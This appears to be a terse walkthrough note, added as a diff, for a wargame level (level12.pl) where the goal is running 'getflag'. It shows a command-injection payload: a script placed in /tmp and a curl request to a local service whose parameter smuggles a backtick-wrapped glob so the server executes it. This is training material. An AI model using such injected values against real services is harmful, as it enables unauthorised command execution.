@@ -1,0 +1,11 @@
+cat : level12.pl
+-> regex eploit yeha fun...
+
+-> create /tmp/TEST
+
+#!/bin/sh
+getflag > /tmp/q
+
+curl localhost:4646?x='`/*/TEST`'
+
+-> win
